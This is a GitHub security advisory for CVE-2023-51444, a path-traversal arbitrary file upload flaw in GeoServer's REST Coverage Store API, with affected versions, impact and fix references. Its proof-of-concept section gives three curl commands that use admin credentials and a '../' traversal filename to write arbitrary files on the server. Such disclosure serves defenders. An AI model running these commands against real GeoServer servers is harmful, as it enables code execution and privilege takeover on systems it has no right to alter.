# [H] Arbitrary file upload vulnerability in GeoServer's REST Coverage Store API

## Summary
Severity: High
Advisory: GHSA-9v5q-2gwq-q9hq
CVE: CVE-2023-51444
CWE: CWE-20, CWE-434
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2024-03-20
Source: https://github.com/advisories/GHSA-9v5q-2gwq-q9hq
Type: github-advisory

## Affected
- Maven: `org.geoserver:gs-platform` — affected >=0 <2.23.4
- Maven: `org.geoserver:gs-restconfig` — affected >=0 <2.23.4
- Maven: `org.geoserver:gs-platform` — affected >=2.24.0 <2.24.1
- Maven: `org.geoserver:gs-restconfig` — affected >=2.24.0 <2.24.1

## Details
### Summary
An arbitrary file upload vulnerability exists that enables an authenticated administrator with permissions to modify coverage stores through the REST Coverage Store API to upload arbitrary file contents to arbitrary file locations which can lead to remote code execution.

### Details
Coverage stores that are configured using relative paths use a GeoServer Resource implementation that has validation to prevent path traversal but coverage stores that are configured using absolute paths use a different Resource implementation that does not prevent path traversal.

### PoC
Step 1 (create sample coverage store):
curl -vXPUT -H"Content-type:application/zip" -u"admin:geoserver" --data-binary @polyphemus.zip "http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.imagemosaic"
Step 2 (switch store to absolute URL):
curl -vXPUT -H"Content-Type:application/xml" -u"admin:geoserver" -d"<coverageStore><url>file:///{absolute path to data directory}/data/sf/filewrite</url></coverageStore>" "http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite"
Step 3 (upload arbitrary files):
curl -vH"Content-Type:" -u"admin:geoserver" --data-binary @file/to/upload "http://localhost:8080/geoserver/rest/workspaces/sf/coveragestores/filewrite/file.a?filename=../../../../../../../../../../file/to/write"
Steps 1 & 2 can be combined into a single POST REST call if local write access to anywhere on the the file system that GeoServer can read is possible (e.g., the /tmp directory).

### Impact
This vulnerability can lead to executing arbitrary code.  An administrator with limited privileges could also potentially exploit this to overwrite GeoServer security files and obtain full administrator privileges.

### References
https://osgeo-org.atlassian.net/browse/GEOS-11176
https://github.com/geoserver/geoserver/pull/7222

## References
- https://github.com/geoserver/geoserver/security/advisories/GHSA-9v5q-2gwq-q9hq
- https://nvd.nist.gov/vuln/detail/CVE-2023-51444
- https://github.com/geoserver/geoserver/pull/7222
- https://github.com/geoserver/geoserver/commit/ca683170c669718cb6ad4c79e01b0451065e13b8
- https://github.com/geoserver/geoserver/commit/fe235b3bb1d7f05751a4a2ef5390c36f5c9e78ae
- https://github.com/geoserver/geoserver
- https://osgeo-org.atlassian.net/browse/GEOS-11176
